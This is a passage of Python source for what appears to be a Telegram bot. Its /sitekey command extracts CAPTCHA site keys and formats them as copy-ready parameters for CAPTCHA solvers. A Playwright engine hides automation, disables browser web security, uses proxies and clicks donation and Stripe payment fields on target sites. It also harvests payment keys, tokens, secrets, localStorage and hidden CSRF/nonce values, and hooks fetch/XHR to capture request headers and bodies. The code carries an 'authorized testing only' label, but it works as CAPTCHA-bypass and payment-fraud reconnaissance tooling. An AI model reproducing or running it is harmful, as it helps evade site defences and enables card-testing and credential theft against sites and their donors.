            dedup = f.get("type","") + ":" + f.get("site_key","")
            if dedup in seen_keys:
                continue
            seen_keys.add(dedup)
            tagged = dict(f)
            tagged["source"] = f"[{label}] " + f.get("source", "")
            hits.append(tagged)
        scanned[0] += 1
        if progress_cb:
            progress_cb(f"🔍 Scanning {scanned[0]}/{total} pages... ({label})")
        return hits

    # ── Main URL (serial, first) ──────────────────────────────────────────
    if progress_cb:
        progress_cb(f"🔍 Scanning 1/{total} pages... (main URL)")
    main_hits = _scan_one(url, "main")
    scanned[0] = 1
    all_findings.extend(main_hits)

    # ── Sub-pages (concurrent, max 4 workers, 12s timeout each) ──────────
    def _scan_sub(path: str) -> list:
        return _scan_one(base_origin + path, path)

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        futures = {ex.submit(_scan_sub, p): p for p in sub_paths}
        sub_results = {}
        try:
            for fut in concurrent.futures.as_completed(futures, timeout=12 * len(sub_paths)):
                path = futures[fut]
                try:
                    sub_results[path] = fut.result(timeout=12)
                except Exception:
                    sub_results[path] = []
        except concurrent.futures.TimeoutError:
            for fut in futures:
                fut.cancel()

    # ── Merge sub-page findings in path order ─────────────────────────────
    for path in sub_paths:
        all_findings.extend(sub_results.get(path, []))

    # ── Build combined result ─────────────────────────────────────────────
    base_result = _sitekey_sync.__doc__ and {}   # dummy; we build manually
    return {
        "findings":   all_findings,
        "page_url":   url,
        "js_fetched": len(all_findings),
        "error":      None,
    }
    for sub in sub_paths:
        sub_url = base_origin + sub
        if progress_cb: progress_cb(f"🔍 Sub-page scan: `{sub}`...")
        try:
            sub_result = _sitekey_sync(sub_url, progress_cb)
            if sub_result.get("findings"):
                # Tag each finding with the sub-page it was found on
                for f in sub_result["findings"]:
                    f["source"] = f"[sub-page {sub}] " + f.get("source", "")
                return sub_result
        except Exception:
            pass

    # Return the (empty) main-URL result if nothing found anywhere
    return result


def _sitekey_static(url: str, progress_cb=None) -> dict:
    """Fallback: requests-based static HTML + JS scan (no browser)."""
    session = requests.Session()
    session.headers.update(_get_headers())

    if progress_cb: progress_cb("⬇️ Fetching page HTML (static)...")
    try:
        resp = session.get(url, timeout=15, verify=False, allow_redirects=True)
        resp.raise_for_status()
        html     = resp.text
        page_url = resp.url
    except Exception as e:
        return {"error": str(e), "findings": [], "page_url": url}

    final_parsed = urlparse(page_url)
    base_origin  = f"{final_parsed.scheme}://{final_parsed.netloc}"

    def _resolve(src):
        if not src: return None
        src = src.strip()
        if src.startswith('//'): return final_parsed.scheme + ':' + src
        if src.startswith('http'): return src
        if src.startswith('/'): return base_origin + src
        base_path = final_parsed.path.rsplit('/', 1)[0]
        return f"{base_origin}{base_path}/{src}"

    soup = BeautifulSoup(html, 'html.parser')
    js_seen, js_ordered = set(), []

    def _add_js(u):
        if u and u.startswith('http') and u not in js_seen:
            js_seen.add(u); js_ordered.append(u)

    for tag in soup.find_all('script', src=True):
        _add_js(_resolve(tag['src']))

    captcha_sigs_flat = [s for sigs in _CAPTCHA_SCRIPT_SIGS.values() for s in sigs]
    def _prio(u):
        n = u.lower()
        if any(s in n for s in captcha_sigs_flat): return 0
        if any(k in n for k in ('main','app','index','chunk','bundle','vendor','runtime')): return 1
        return 2

    fetch_list = sorted(js_ordered, key=_prio)[:15]

    if progress_cb: progress_cb(f"📦 Fetching {len(fetch_list)} JS files...")
    js_sources = {}
    for js_url in fetch_list:
        try:
            r = session.get(js_url, timeout=10, verify=False)
            if r.status_code == 200 and len(r.text) > 50:
                js_sources[js_url] = r.text[:800_000]
        except Exception:
            pass

    if progress_cb: progress_cb(f"🔍 Scanning {len(js_sources)} JS files...")
    findings = _extract_captcha_info(html, page_url, js_sources)
    return {"findings": findings, "page_url": page_url, "js_fetched": len(js_sources), "error": None}


async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sitekey <url> — Extract reCAPTCHA/hCaptcha/Turnstile site_key, page_url, action"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/sitekey https://example.com`\n\n"
            "🔑 *Extracts:*\n"
            "  • `site_key` — Captcha public key\n"
            "  • `page_url` — Final URL (after redirects)\n"
            "  • `action`   — reCAPTCHA v3 action name\n\n"
            "🛡️ *Supported Captcha Types:*\n"
            "  • reCAPTCHA v2 _(data-sitekey / grecaptcha.render)_\n"
            "  • reCAPTCHA v3 _(grecaptcha.execute + action)_\n"
            "  • reCAPTCHA Enterprise\n"
            "  • hCaptcha _(UUID format key)_\n"
            "  • Cloudflare Turnstile _(0x4A... / 1x00...)_\n"
            "  • FunCaptcha / Arkose Labs\n"
            "  • GeeTest\n"
            "  • AWS WAF Captcha\n\n"
            "📦 HTML source + JS bundles ကို scan မည်\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔑 *Site Key Extractor*\n🌐 `{domain}`\n\n"
        "🌐 Launching headless browser...\n"
        "📡 Intercepting network requests...\n"
        "🔍 Scanning DOM + console logs...\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔑 *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except BadRequest:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _sitekey_with_subpages, url, lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("error"):
        await msg.edit_text(
            f"❌ *Fetch error*\n`{result['error']}`",
            parse_mode='Markdown'
        )
        return

    findings  = result["findings"]
    page_url  = result["page_url"]
    js_count  = result["js_fetched"]

    # ─── No captcha found ───────────────────────
    if not findings:
        await msg.edit_text(
            f"🔑 *Site Key Extractor — `{domain}`*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 *Captcha မတွေ့ပါ*\n\n"
            f"🌐 Page URL: `{page_url}`\n"
            f"📡 Requests intercepted: `{js_count}`\n\n"
            "_Network requests, DOM, console logs အကုန် scan ပြီးပါပြီ_\n"
            "_Site မှာ Captcha မပါ သို့မဟုတ် render ပြီးမှ load ဖြစ်နိုင်သည်_",
            parse_mode='Markdown'
        )
        return

    # ─── Build report ────────────────────────────
    lines = [
        f"🔑 *Site Key Extractor — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🌐 Page URL: `{page_url}`",
        f"📡 Requests intercepted: `{js_count}`",
        f"✅ Found: `{len(findings)}` captcha instance(s)",
        "",
    ]

    # Type icons
    _TYPE_ICON = {
        "reCAPTCHA v2":          "🔵",
        "reCAPTCHA v3":          "🟣",
        "reCAPTCHA Enterprise":  "🟤",
        "hCaptcha":              "🟡",
        "Cloudflare Turnstile":  "🟠",
        "FunCaptcha":            "🔴",
        "GeeTest":               "🟢",
        "AWS WAF Captcha":       "⚪",
    }

    for i, f in enumerate(findings, 1):
        icon = next((v for k, v in _TYPE_ICON.items() if k in f["type"]), "🔑")
        lines.append(f"*{icon} [{i}] {f['type']}*")
        lines.append(f"  🔑 `site_key`  : `{f['site_key'] or 'N/A'}`")
        lines.append(f"  🌐 `page_url`  : `{f['page_url']}`")
        if f.get("action"):
            lines.append(f"  ⚡ `action`     : `{f['action']}`")
        if f.get("invisible"):
            lines.append(f"  👁️ `invisible`  : `true`")
        if f.get("min_score"):
            lines.append(f"  📊 `min_score` : `{f['min_score']}`")
        if f.get("enterprise"):
            lines.append(f"  🏢 `enterprise` : `true`")
        if f.get("theme"):
            lines.append(f"  🎨 `theme`      : `{f['theme']}`")
        if f.get("size") and f["size"] != "normal":
            lines.append(f"  📐 `size`       : `{f['size']}`")
        if f.get("badge"):
            lines.append(f"  🏷️ `badge`      : `{f['badge']}`")
        if f.get("s_param"):
            lines.append(f"  🔐 `s param`    : `{f['s_param'][:40]}`")
        if f.get("hl"):
            lines.append(f"  🌍 `hl`         : `{f['hl']}`")
        if f.get("co"):
            lines.append(f"  🏠 `co`         : `{f['co']}`")
        if f.get("callback"):
            lines.append(f"  📞 `callback`   : `{f['callback']}`")
        if f.get("user_agent"):
            lines.append(f"  🖥️ `user_agent` : `{f['user_agent'][:60]}`")
        lines.append(f"  📂 Source      : _{f['source'][:70]}_")
        lines.append("")

        # ── Solver-ready block ─────────────────────────────
        lines.append("  *📋 Solver params (copy-ready):*")
        lines.append(f"  `type`      = `{f['type']}`")
        lines.append(f"  `sitekey`   = `{f['site_key']}`")
        lines.append(f"  `pageurl`   = `{f['page_url']}`")
        if f.get("action"):
            lines.append(f"  `action`    = `{f['action']}`")
        if f.get("enterprise"):
            lines.append(f"  `enterprise`= `1`")
        if f.get("min_score"):
            lines.append(f"  `min_score` = `{f['min_score']}`")
        if f.get("invisible"):
            lines.append(f"  `invisible` = `1`")
        if f.get("s_param"):
            lines.append(f"  `data-s`    = `{f['s_param'][:40]}`")
        lines.append("")

    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚠️ _Authorized testing only_")

    report = "\n".join(lines)

    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
            await update.effective_message.reply_text(report[4000:8000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # ─── Export JSON ─────────────────────────────
    import io as _io
    ts        = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d    = re.sub(r'[^\w\-]', '_', domain)
    export = {
        "domain":     domain,
        "page_url":   page_url,
        "scanned_at": datetime.now().isoformat(),
        "js_scanned": js_count,
        "findings": [
            {
                "type":       f["type"],
                "site_key":   f["site_key"],
                "page_url":   f["page_url"],
                "action":     f.get("action", ""),
                "source":     f.get("source", ""),
                "theme":      f.get("theme", ""),
                "size":       f.get("size", ""),
                "invisible":  f.get("invisible", False),
                "badge":      f.get("badge", ""),
                "min_score":  f.get("min_score", ""),
                "enterprise": f.get("enterprise", False),
                "s_param":    f.get("s_param", ""),
                "hl":         f.get("hl", ""),
                "co":         f.get("co", ""),
                "callback":   f.get("callback", ""),
                "user_agent": f.get("user_agent", ""),
                # ── Solver-ready format ──
                "solver_params": {
                    k: v for k, v in {
                        "type":       f["type"],
                        "sitekey":    f["site_key"],
                        "pageurl":    f["page_url"],
                        "action":     f.get("action"),
                        "enterprise": 1 if f.get("enterprise") else None,
                        "min_score":  f.get("min_score") or None,
                        "invisible":  1 if f.get("invisible") else None,
                        "data-s":     f.get("s_param") or None,
                        "useragent":  f.get("user_agent") or None,
                    }.items() if v is not None and v != ""
                },
            }
            for f in findings
        ],
    }
    json_buf = _io.BytesIO(json.dumps(export, indent=2, ensure_ascii=False).encode())
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=json_buf,
            filename=f"sitekey_{safe_d}_{ts}.json",
            caption=(
                f"🔑 *Site Key Report — `{domain}`*\n"
                f"Found: `{len(findings)}` | JS: `{js_count}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("Sitekey export error: %s", e)




# ══════════════════════════════════════════════════
# 🗝️  KEY EXTRACTOR ENGINE — Shared Playwright runner
# ══════════════════════════════════════════════════

def _run_playwright_extract(url: str, js_eval_code: str, progress_cb=None) -> dict:
    """
    v19 UPGRADED Core Engine:
    - networkidle wait (JS SDK တွေ fully load ဖြစ်မှ scan)
    - response body 512KB (Phase 2: 120KB→512KB — webpack chunk အပြည့်ဖမ်း)
    - JS files 60 ခု fetch (Phase 2: 25→60 — code-split apps ပါ)
    - disable-web-security: iframe cross-origin request ဖမ်းနိုင်
    - Interactive simulation: scroll + payment button click
    - window globals deep scan: __NEXT_DATA__, __nuxt__, Stripe, etc.
    - All frames (including payment iframes) traversal
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"error": "playwright_not_installed", "html": "", "network_log": [],
                "console_log": [], "dom_result": None, "page_url": url}

    network_log  = []
    console_log  = []
    page_url_ref = [url]
    _seen_urls   = set()

    with sync_playwright() as pw:
        _px = proxy_manager.get_proxy()
        _pw_proxy = None
        if _px:
            from urllib.parse import urlparse as _up
            _pp = _up(_px.get("http") or _px.get("https", ""))
            _pw_proxy = {"server": f"{_pp.scheme}://{_pp.hostname}:{_pp.port}"}
            if _pp.username:
                _pw_proxy["username"] = _pp.username
                _pw_proxy["password"] = _pp.password or ""

        browser = pw.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
                "--disable-web-security",                          # iframe cross-origin ဖမ်းနိုင်
                "--disable-features=IsolateOrigins,site-per-process",
                "--allow-running-insecure-content",
                "--disable-gpu",
            ]
        )
        ctx = browser.new_context(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/122.0.0.0 Safari/537.36"
            ),
            viewport={"width": 1440, "height": 900},
            ignore_https_errors=True,
            proxy=_pw_proxy,
            java_script_enabled=True,
            extra_http_headers={
                "Accept-Language": "en-US,en;q=0.9",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            }
        )
        # Advanced stealth init
        ctx.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
            window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}, app: {}};
            Object.defineProperty(navigator, 'permissions', {
                get: () => ({query: () => Promise.resolve({state: 'granted'})})
            });
        """)
        page = ctx.new_page()

        def _add_network(url_str, method, post_data, response_body):
            if url_str not in _seen_urls:
                _seen_urls.add(url_str)
                network_log.append({
                    "url": url_str,
                    "method": method,
                    "post_data": post_data[:3000] if post_data else "",
                    "response_body": response_body[:524288] if response_body else "",
                })

        def _on_request(req):
            try:
                pd = req.post_data or ""
            except Exception:
                pd = ""
            _add_network(req.url, req.method, pd, "")

        def _on_response(resp):
            # ── Body ကို JS / JSON / text response တွေမှာ ဖမ်းသည် ──
            ct = resp.headers.get("content-type", "").lower()
            is_js   = any(x in ct for x in ("javascript", "ecmascript"))
            is_json = "json" in ct
            is_text = "text" in ct
            if not (is_js or is_json or is_text):
                return
            if resp.status not in (200, 201):
                return
            try:
                body = resp.body().decode("utf-8", errors="ignore")
            except Exception:
                return
            # Update existing entry or add new
            for entry in network_log:
                if entry["url"] == resp.url:
                    if not entry["response_body"]:
                        entry["response_body"] = body[:524288]
                    return
            _add_network(resp.url, "GET", "", body[:524288])

        page.on("request",  _on_request)
        page.on("response", _on_response)
        page.on("console",  lambda m: console_log.append(m.text[:500]))

        # ── Phase 3 Fix 1: WebSocket frame capture ──
        _ws_frames = []
        def _on_websocket(ws):
            ws_url = ws.url
            def _on_frame_sent(payload):
                if payload and len(str(payload)) > 4:
                    _ws_frames.append({"dir": "send", "url": ws_url,
                                       "payload": str(payload)[:500]})
            def _on_frame_recv(payload):
                if payload and len(str(payload)) > 4:
                    _ws_frames.append({"dir": "recv", "url": ws_url,
                                       "payload": str(payload)[:500]})
            ws.on("framesent",   _on_frame_sent)
            ws.on("framereceived", _on_frame_recv)
        page.on("websocket", _on_websocket)

        # ── Step 1: Initial page load — wait for networkidle ──
        try:
            page.goto(url, wait_until="load", timeout=30_000)
            page_url_ref[0] = page.url
        except PWTimeout:
            page_url_ref[0] = page.url
        except Exception as e:
            browser.close()
            return {"error": str(e), "html": "", "network_log": [],
                    "console_log": [], "dom_result": None, "page_url": url}

        # Wait for JS SDKs to fully initialize
        try:
            page.wait_for_load_state("networkidle", timeout=12_000)
        except Exception:
            pass
        page.wait_for_timeout(2000)

        # ── Step 2: Interactive simulation — trigger lazy-load JS ──
        try:
            # Scroll in steps (trigger IntersectionObserver lazy loads)
            for pct in [0.25, 0.5, 0.75, 1.0]:
                page.evaluate(f"window.scrollTo(0, document.body.scrollHeight * {pct})")
                page.wait_for_timeout(600)
            page.evaluate("window.scrollTo(0, 0)")
            page.wait_for_timeout(400)

            # Click payment / donate triggers to load payment SDKs
            _payment_selectors = [
                # Donation forms (GiveWP, Stripe Checkout, PayPal)
                "input[name='give-amount']", "input[name='amount']",
                "button[data-amount]", ".give-btn-level",
                "[class*='donate']", "[id*='donate']",
                "[class*='payment']", "[id*='payment']",
                # Generic checkout / submit
                "button[type='submit']", "input[type='submit']",
                "button[class*='checkout']", "button[class*='pay']",
                # Form fields (focus triggers captcha widget init)
                "input[type='email']", "input[type='text']:first-of-type",
                # Card number fields (Stripe Elements)
                ".__PrivateStripeElement", "[class*='StripeElement']",
                "iframe[name*='__privateStripeFrame']",
            ]
            for sel in _payment_selectors:
                try:
                    el = page.query_selector(sel)
                    if el and el.is_visible():
                        el.scroll_into_view_if_needed()
                        page.wait_for_timeout(200)
                        try:
                            el.click(timeout=1500)
                        except Exception:
                            pass
                        page.wait_for_timeout(300)
                except Exception:
                    pass

            # Wait for SDK network activity after interactions
            try:
                page.wait_for_load_state("networkidle", timeout=8_000)
            except Exception:
                pass
            page.wait_for_timeout(1500)

        except Exception:
            pass

        # ── Step 3: Fetch external JS bundles not yet captured ──
        try:
            js_urls_on_page = page.evaluate("""() =>
                [...document.querySelectorAll('script[src]')]
                    .map(s => s.src)
                    .filter(s => s.startsWith('http'))
            """) or []
        except Exception:
            js_urls_on_page = []

        # Also probe common manifest endpoints for chunk discovery
        from urllib.parse import urlparse as _up_js
        _base_parsed = _up_js(page_url_ref[0])
        _origin = f"{_base_parsed.scheme}://{_base_parsed.netloc}"
        _manifest_paths = [
            "/asset-manifest.json", "/webpack-manifest.json",
            "/__manifest__", "/static/js/main.chunk.js",
            "/js/app.js", "/js/main.js",
        ]
        for mp in _manifest_paths:
            murl = _origin + mp
            if murl not in _seen_urls:
                try:
                    r = ctx.request.get(murl, timeout=5000)
                    if r.ok and "json" in r.headers.get("content-type",""):
                        body = r.text()
                        _add_network(murl, "GET", "", body)
                        # Extract chunk URLs from manifest
                        import re as _re
                        for chunk_url in _re.findall(r'"(https?://[^"]+\.js)"', body):
                            if chunk_url not in _seen_urls:
                                js_urls_on_page.append(chunk_url)
                except Exception:
                    pass

        # ── Phase 2: Link header preload + dynamic import() chunk discovery ──
        import re as _re2
        # 1. HTTP Link header
        try:
            _link_resp = ctx.request.get(page_url_ref[0], timeout=5000)
            _link_hdr  = _link_resp.headers.get("link", "") or _link_resp.headers.get("Link", "")
            for _lm in _re2.finditer(r'<([^>]+\.js)>', _link_hdr):
                _lurl = _lm.group(1)
                if not _lurl.startswith("http"):
                    _lurl = _origin + (_lurl if _lurl.startswith("/") else "/" + _lurl)
                if _lurl not in _seen_urls:
                    js_urls_on_page.append(_lurl)
        except Exception:
            pass

        # 2. Dynamic import() / require.ensure() chunk URLs in already-fetched JS
        _dyn_pat = _re2.compile(r'(?:import\(|require\.ensure\(\[?)["\']([^"\']+\.js)["\']')
        for _entry in list(network_log):
            for _dm in _dyn_pat.finditer(_entry.get("response_body", "")[:80000]):
                _chunk = _dm.group(1)
                if not _chunk.startswith("http"):
                    _chunk = _origin + ("/" if not _chunk.startswith("/") else "") + _chunk
                if _chunk not in _seen_urls:
                    js_urls_on_page.append(_chunk)

        # 3. Next.js _buildManifest chunk list
        try:
            _bm_urls = _re2.findall(r'/_next/static/[^"\']+/_buildManifest\.js', html)
            for _bmu in _bm_urls[:2]:
                _bm_full = _origin + _bmu
                if _bm_full not in _seen_urls:
                    _bmr = ctx.request.get(_bm_full, timeout=5000)
                    if _bmr.ok:
                        _add_network(_bm_full, "GET", "", _bmr.text())
                        for _nc in _re2.findall(r'"(/[^"]+\.js)"', _bmr.text()):
                            _ncu = _origin + _nc
                            if _ncu not in _seen_urls:
                                js_urls_on_page.append(_ncu)
        except Exception:
            pass

        # Deduplicate chunk list
        js_urls_on_page = list(dict.fromkeys(js_urls_on_page))

        # Fetch uncaptured JS files (up to 60, Phase 2)
        fetched = 0
        for js_url in js_urls_on_page:
            if fetched >= 60:
                break
            if js_url in _seen_urls:
                existing = next((e for e in network_log if e["url"] == js_url), None)
                if existing and existing["response_body"]:
                    continue
            try:
                r = ctx.request.get(js_url, timeout=10000)
                if r.ok:
                    body = r.text()
                    _add_network(js_url, "GET", "", body[:524288])
                    fetched += 1
            except Exception:
                pass

        # ── Step 4: Deep window globals scan ──
        _DEEP_GLOBALS_JS = """() => {
            const out = {};
            // Payment SDK globals
            const payGlobals = [
                'Stripe', 'stripe', 'stripePublishableKey',
                'STRIPE_PUBLISHABLE_KEY', 'NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY',
                'REACT_APP_STRIPE_KEY', 'STRIPE_KEY',
                'paypal', 'PayPal', 'PAYPAL_CLIENT_ID',
                'braintree', 'square', 'razorpay',
                'Adyen', 'adyen', 'klarna', 'Klarna',
            ];
            payGlobals.forEach(k => {
                try {
                    const v = window[k];
                    if (v !== undefined && v !== null) {
                        if (typeof v === 'string') out[k] = v;
                        else if (typeof v === 'function' && v._apiKey) out[k+'._apiKey'] = v._apiKey;
                        else if (typeof v === 'object') {
                            try { out[k] = JSON.stringify(v).substring(0, 400); } catch(e) {}
                        }
                    }
                } catch(e) {}
            });

            // Framework env objects
            const envObjects = {
                '__NEXT_DATA__': window.__NEXT_DATA__,
                '__NUXT__': window.__NUXT__,
                '__APP_CONFIG__': window.__APP_CONFIG__,
                '__ENV__': window.__ENV__,
                '_env_': window._env_,
                'ENV': window.ENV,
                'appConfig': window.appConfig,
                'siteConfig': window.siteConfig,
                'wpApiSettings': window.wpApiSettings,
                'woocommerce_params': window.woocommerce_params,
                'give_global_vars': window.give_global_vars,
            };
            Object.entries(envObjects).forEach(([k,v]) => {
                if (!v) return;
                try {
                    const s = typeof v === 'string' ? v : JSON.stringify(v);
                    if (s && s.length > 5) out[k] = s.substring(0, 2000);
                } catch(e) {}
            });

            // Scan all window keys for anything key/token/secret-like
            Object.keys(window).forEach(k => {
                try {
                    const kl = k.toLowerCase();
                    if (kl.includes('key') || kl.includes('token') ||
                        kl.includes('secret') || kl.includes('stripe') ||
                        kl.includes('paypal') || kl.includes('api')) {
                        const v = window[k];
                        if (typeof v === 'string' && v.length > 8 && v.length < 300) {
                            out['win:'+k] = v;
                        }
                    }
                } catch(e) {}
            });

            // localStorage + sessionStorage
            try {
                const ls = {};
                for (let i=0; i<localStorage.length; i++) {
                    const k = localStorage.key(i);
                    const v = localStorage.getItem(k) || '';
                    if (v.length > 5 && v.length < 500) ls[k] = v;
                }
                if (Object.keys(ls).length) out['__localStorage__'] = JSON.stringify(ls);
            } catch(e) {}

            // Meta tags (publishable keys often here)
            const metaKeys = {};
            document.querySelectorAll('meta').forEach(m => {
                const n = m.name || m.getAttribute('property') || '';
                const c = m.content || '';
                if (c.length > 5 && (n.includes('key') || n.includes('token') ||
                    n.includes('stripe') || n.includes('paypal') || n.includes('id'))) {
                    metaKeys[n] = c;
                }
            });
            if (Object.keys(metaKeys).length) out['__meta__'] = JSON.stringify(metaKeys);

            // All iframe srcs (payment iframes)
            const iframes = [];
            document.querySelectorAll('iframe').forEach(f => {
                const src = f.src || f.getAttribute('src') || '';
                const name = f.name || '';
                if (src) iframes.push({src: src.substring(0,300), name});
            });
            if (iframes.length) out['__iframes__'] = JSON.stringify(iframes);

            return out;
        }"""

        html = ""
        try:
            html = page.content()
        except Exception:
            pass

        dom_result = None
        try:
            dom_result = page.evaluate(_DEEP_GLOBALS_JS)
        except Exception as e:
            logger.debug("Deep globals JS eval error: %s", e)

        # ── Step 4b: ShadowDOM pierce — Playwright pierce: selector (open roots) ──
        try:
            shadow_inputs = page.query_selector_all(
                "pierce/input[type=hidden], pierce/input[name*=csrf], "
                "pierce/input[name*=token], pierce/input[name*=nonce]"
            )
            shadow_findings = []
            for si in shadow_inputs:
                try:
                    name_attr  = si.get_attribute("name") or si.get_attribute("id") or "shadow-hidden"
                    value_attr = si.input_value() or ""
                    if len(value_attr) >= 8:
                        shadow_findings.append({"name": name_attr, "value": value_attr[:200], "tag": "SHADOW-INPUT"})
                except Exception:
                    pass
            if shadow_findings and dom_result is not None:
                dom_result["__shadow_tokens__"] = shadow_findings
            elif shadow_findings:
                dom_result = {"__shadow_tokens__": shadow_findings}
        except Exception as _se:
            logger.debug("ShadowDOM pierce scan error: %s", _se)

        # ── Step 5: Traverse all frames for payment data ──
        frame_data = []
        try:
            for frame in page.frames:
                if frame == page.main_frame:
                    continue
                frame_url = frame.url or ""
                if not frame_url or frame_url == "about:blank":
                    continue
                frame_data.append(frame_url)
                # Scan frame URL for keys
                try:
                    frame_html = frame.content()
                    if frame_html and len(frame_html) > 100:
                        network_log.append({
                            "url": f"[frame] {frame_url}",
                            "method": "FRAME",
                            "post_data": "",
                            "response_body": frame_html[:60000],
                        })
                except Exception:
                    pass
        except Exception:
            pass
        if frame_data and dom_result is not None:
            dom_result["__frames__"] = json.dumps(frame_data)

        # Wire WS frames into network_log as special entries
        for _wsf in _ws_frames:
            network_log.append({
                "url":           f"[ws] {_wsf['url']}",
                "method":        f"WS:{_wsf['dir'].upper()}",
                "post_data":     _wsf["payload"] if _wsf["dir"] == "send" else "",
                "response_body": _wsf["payload"] if _wsf["dir"] == "recv" else "",
                "content_type":  "application/websocket-frame",
            })
        if _ws_frames and dom_result is not None:
            dom_result["__ws_urls__"] = json.dumps(
                list(dict.fromkeys(f["url"] for f in _ws_frames))[:20]
            )

        browser.close()

    return {
        "error":       None,
        "html":        html,
        "network_log": network_log,
        "console_log": console_log,
        "dom_result":  dom_result,
        "page_url":    page_url_ref[0],
        "ws_frames":   _ws_frames,
    }


def _static_extract(url: str) -> dict:
    """Fallback: requests-based HTML + JS fetch (no browser)."""
    session = requests.Session()
    session.headers.update(_get_headers())
    px = proxy_manager.get_proxy()
    if px:
        session.proxies.update(px)
    try:
        resp = session.get(url, timeout=15, verify=False, allow_redirects=True)
        html = resp.text
        page_url = resp.url
    except Exception as e:
        return {"error": str(e), "html": "", "network_log": [], "page_url": url}

    from urllib.parse import urlparse as _up2
    fp = _up2(page_url)
    base = f"{fp.scheme}://{fp.netloc}"
    soup_s = BeautifulSoup(html, "html.parser")
    network_log = []
    for tag in soup_s.find_all("script", src=True):
        src = tag["src"]
        if src.startswith("//"): src = fp.scheme + ":" + src
        elif src.startswith("/"): src = base + src
        if src.startswith("http"):
            try:
                r2 = session.get(src, timeout=8, verify=False)
                if r2.status_code == 200:
                    network_log.append({"url": src, "method": "GET",
                                        "post_data": "", "response_body": r2.text[:80000]})
            except Exception:
                pass
    return {"error": None, "html": html, "network_log": network_log,
            "console_log": [], "page_url": page_url}


def _gather_all_text(data: dict) -> list:
    """Return list of (text, source_label) from html + all JS."""
    texts = []
    if data.get("html"):
        texts.append((data["html"], "HTML source"))
    for entry in data.get("network_log", []):
        if entry.get("response_body"):
            texts.append((entry["response_body"], f"JS: {entry['url'][:70]}"))
        if entry.get("post_data"):
            texts.append((entry["post_data"], f"POST → {entry['url'][:60]}"))
    if data.get("console_log"):
        texts.append(("\n".join(data["console_log"]), "Console logs"))
    return texts


# ══════════════════════════════════════════════════════════════════════
# 🔴  REAL-TIME NETWORK STREAM INTERCEPTOR  (False-positive reducer)
#
#  ယခင် engine: JS/HTML static scan → key ပါရင် report တက်
#  ဒီ engine:   Live XHR/Fetch hook → actual request မှာ သုံးနေမှ HIGH
#
#  လုပ်ဆောင်ချက်:
#   1. JS-level fetch/XHR monkey-patch → request headers + bodies ဖမ်း
#   2. SSE (EventSource) stream frames ဖမ်း
#   3. WebSocket send frames ဖမ်း (existing ws hook နဲ့ merge)
#   4. Confidence scoring: static hit + live usage = CONFIRMED
#   5. _gather_all_text_v2 → live data ပါ merge ထည့်
# ══════════════════════════════════════════════════════════════════════

# JS hook — page ထဲ inject လုပ်ပြီး fetch/XHR/SSE တိုင်းကို intercept
_STREAM_INTERCEPT_JS = """
() => {
    window.__streamLog = window.__streamLog || [];
    const _log = (entry) => { window.__streamLog.push(entry); };

    // ── 1. fetch() hook ────────────────────────────────────────────
    const _origFetch = window.fetch;
    window.fetch = async function(...args) {
        const req = args[0];
        const opts = args[1] || {};
        const url  = (req instanceof Request) ? req.url : String(req);
        const method = opts.method || (req instanceof Request ? req.method : 'GET');
        const headers = {};
        try {
            const h = (req instanceof Request) ? req.headers : new Headers(opts.headers || {});
            h.forEach((v, k) => { headers[k.toLowerCase()] = v; });
        } catch(e) {}
        const bodySnip = typeof opts.body === 'string' ? opts.body.slice(0,500) :
                         (opts.body instanceof URLSearchParams ? opts.body.toString().slice(0,500) : '');
        _log({type:'fetch', url, method, headers, body: bodySnip, ts: Date.now()});

        const resp = await _origFetch.apply(this, args);
        try {
            const ct = resp.headers.get('content-type') || '';
            if (ct.includes('json') || ct.includes('text')) {
                const clone = resp.clone();
                clone.text().then(t => {
                    _log({type:'fetch_response', url, status: resp.status,
